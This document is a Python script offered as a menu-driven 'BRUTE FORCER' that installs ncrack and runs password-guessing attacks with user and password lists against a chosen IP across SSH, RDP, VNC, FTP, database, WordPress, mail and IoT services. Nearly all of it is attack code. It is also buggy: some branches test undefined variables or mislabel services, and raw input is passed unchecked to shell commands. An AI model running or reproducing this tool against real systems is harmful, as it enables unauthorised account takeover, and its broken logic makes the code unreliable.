#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("apt-get install figlet ncrack -y")
os.system("clear")
def menu():
	try:
		while True:
			os.system("figlet BRUTE FORCER")
			targetip = input("Enter target IP: ")
			userlist = input("Enter userlist way: ")
			passw = input("Enter passwordlist way: ")
			
			print(""" 
BRUTE FORCER


!! Select Services !!
1)Remote Management and Access Services
2)File Transfer and Sharing Services
3)Database Services
4)Web and Content Management Systems (CMS)
5)Email and Communication Services
6)IoT and Industrial Services
			""")
			service = input("Select service: ")
			if(service == "1"):
				print(""" 
1)SSH
2)RDP
3)TELNET
4)VNC
5)WINRM
				""")
				section1 = input("Select one service: ")
				
				if(section1 == "1"):
					targetport = input("Enter target port(Default 22): ")
					if not targetport:
						targetport = "22" 
					print(f"SSH to {targetip}:{targetport}")
					ssh1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m ssh:at=2,cd=8s ssh://{targetip}:{targetport}"
					os.system(ssh1)
					
				elif(section1 == "2"):
					targetport = input("Enter target port(Default 3389): ")
					if not targetport:
						targetport = "3389"
					print(f"RDP to {targetip}:{targetport}")
					rdp1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m rdp:at=2,cd=15s rdp://{targetip}:{targetport}"
					os.system(rdp1)
					
				elif(section1 == "3"):
					targetport = input("Enter target port(Default 23): ")
					if not targetport:
						targetport = "23"
					print(f"TelNet to {targetip}:{targetport}")
					telnet1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m telnet:at=1,cd=3s telnet://{targetip}:{targetport}"
					os.system(telnet1)
					
				elif(section1 == "4"):
					targetport = input("Enter target port(Default 5900): ")
					if not targetport:
						targetport = "5900"
					print(f"VNC to {targetip}:{targetport}")
					vnc1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m vnc:at=1,cd=3s vnc://{targetip}:{targetport}"
					os.system(vnc1)
					
				elif(section1 == "5"):
					targetport = input("Enter target port(Default 5985): ")
					if not targetport:
						targetport = "5985"
					print(f"WınRM to {targetip}:{targetport}")
					winrm1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m winrm:at=1,cd=3s winrm://{targetip}:{targetport}"
					os.system(winrm1)
					
				else:
					print("Wrong try again")
					
			elif(service == "2"):
				print(""" 
1)FTP
2)SMP
3)SFTP/SCP
4)TFTP
				""")
				section2 = input("Select one service: ")
				
				if(section2 == "1"):
					targetport = input("Enter target port(Default 21): ")
					if not targetport:
						targetport = "21"
					print(f"FTP to {targetip}:{targetport}")
					ftp1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m ftp:at=1,cd=3s ftp://{targetip}:{targetport}"
					os.system(ftp1)
					
				elif(section2 == "2"):
					targetport = input("Enter the target port(Default 445): ")
					if  not targetport:
						targetport = "445"
					print(f"SMP to {targetip}:{targetport}")
					smp1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m ftp:at=1,cd=3s ftp://{targetip}:{targetport}"
					os.system(smp1)
					
				elif(section2 == "3"):
					targetport = input("Enter the target port(Default 22): ")
					if  not targetport:
						targetport = "22"
					print(f"SFTP/SCP to {targetip}:{targetport}")
					sftp1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m ssh:at=1,cd=3s ssh://{targetip}:{targetport}"
					os.system(sftp1)
					
				elif(section2 == "4"):
					targetport = input("Enter the target port(Default 69): ")
					if  not targetport:
						targetport = "69"
					print(f"TFTP to {targetip}:{targetport}")
					tftp1 = f"ncrack -f -v -T4 -U {userlist} -P {passw} -m tftp:at=1,cd=3s tftp://{targetip}:{targetport}"
					os.system(tftp1)
					
				else:
					print("Wrong try again")
					
			elif(service == "3"):
				print(""" 
1)MySQL
2)PostgreSQL
3)MSSQL
4)MongoDB
5)Redis
				""")
				section3 = input("Select one service: ")
				
				if(section3 == "1"):
					targetport = input("Enter target port(Default 3306): ")
					if not targetport:
						targetport = "3306"
					print(f"MySQL to {targetip}:{targetport}")
					mysql1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m mysql:at=1,cd=3s mysql://{targetip}:{targetport}"
					os.system(mysql1)

				elif(section3 == "2"):
					targetport = input("Enter target port(Default 5432): ")
					if not targetport:
						targetport = "5432"
					print(f"PostgreSQL to {targetip}:{targetport}")
					postgres1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m postgres:at=1,cd=3s postgres://{targetip}:{targetport}"
					os.system(postgres1)

				elif(section3 == "3"):
					targetport = input("Enter target port(Default 1433): ")
					if not targetport:
						targetport = "1433"
					print(f"PostgreSQL to {targetip}:{targetport}")
					mssql1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m mssql:at=1,cd=3s mssql://{targetip}:{targetport}"
					os.system(mssql1)

				elif(section3 == "4"):
					targetport = input("Enter target port(Default 27017): ")
					if not targetport:
						targetport = "27017"
					print(f"PostgreSQL to {targetip}:{targetport}")
					mongodb1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m mongodb:at=1,cd=3s mongodb://{targetip}:{targetport}"
					os.system(mongodb1)

				elif(section3 == "5"):
					targetport = input("Enter target port(Default 6379): ")
					if not targetport:
						targetport = "6379"
					print(f"Redis to {targetip}:{targetport}")
					redis1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m redis:at=1,cd=3s redis://{targetip}:{targetport}"
					os.system(redis1)
					
				else:
					print("Wrong try again")

			elif(service == "4"):
				print(""" 
1)WordPress
2)HTTP 
3)HTTPS
				""")
				section4 = input("Select one service: ")
				if(section4 == "1"):
					targetport = input("Enter target port(Default 80): ")
					if not targetport: 
						targetport = "80"	
					path = input("Enter wp-login path (Default /wp-login.php): ")
					if not path: 
						path = "/wp-login.php"
					print(f"WordPress attack starting on {targetip}:{targetport}{path}")
					wordpress1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m wordpress:path={path},cd=3s wordpress://{targetip}:{targetport}"
					os.system(wordpress1)

				elif(section4 == "2"):
					targetport = input("Enter target port(Default 80): ")
					if not targetport:
						targetport = "80"
					print(f"HTTP to {targetip}:{targetport}")
					http1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} http://{targetip}:{targetport}"
					os.system(http1)
	
				elif(section4 == "3"):
					targetport = input("Enter target port(Default 443): ")
					if not targetport:
						targetport = "443"
					print(f"HTTPS to {targetip}:{targetport}")
					https1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} https://{targetip}:{targetport}"
					os.system(https1)
				
				else:
					print("Wrong try again")
					
			
			elif(section5 == "5"):
				print(""" 
1)POP3
2)POP3S
3)IMAP
4)IMAPS
5)SIP
				""")
				section5 == input("Select one service: ")
				email_ser = {
					"1": ("110", "pop3"),
					"2": ("995", "pop3s"),
					"3": ("143", "imap"),
					"4": ("993", "imaps"),
					"5": ("5060", "sip"),
				}
				if section5 in email_ser:
					d_port, s_name = email_ser[section5]
					targetport = input(f"Enter target port (Default {d_port}): ")
					if not targetport: 
						targetport = d_port
					print(f"{s_name.upper()} attack starting on {targetip}:{targetport}")
					cmd = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m {s_name}:at=1,cd=10s {s_name}://{targetip}:{targetport}"
					os.system(cmd)	
				else:
					print("Wrong try again")
					
			elif(service6 == "6"):
				print(""" 
1)MQTT
2)Redis
3)SNMP
				""")
				section6 = input("Select one service: ")
				if(section6 == "1"):
					targetport = input("Enter target port(Default 1883): ")
					if not targetport:
						targetport = "1883" 
					print(f"MQTT to {targetip}:{targetport}")
					mqtt1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m mqtt:at=2,cd=8s mqtt://{targetip}:{targetport}"
					os.system(mqtt1)				
				elif(section6 == "2"):
					targetport = input("Enter target port(Default 6379): ")
					if not targetport:
						targetport = "6379"
					print(f"Redis to {targetip}:{targetport}")
					redis1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m redis:at=1,cd=3s redis://{targetip}:{targetport}"
					os.system(redis1)
				elif(section6 == "3"):
					targetport = input("Enter target port (Default 161): ")
					if not targetport: 
						targetport = "161"
					print(f"SNMP to {targetip}:{targetport}")
					snmp1 = f"ncrack -f -v -T3 -U {userlist} -P {passw} -m snmp:at=1,cd=10s snmp://{targetip}:{targetport}"
					os.system(snmp1)
	except KeyboardInterrupt:
        	print("\n\nExiting....")				
if __name__ == "__main__":
	menu()
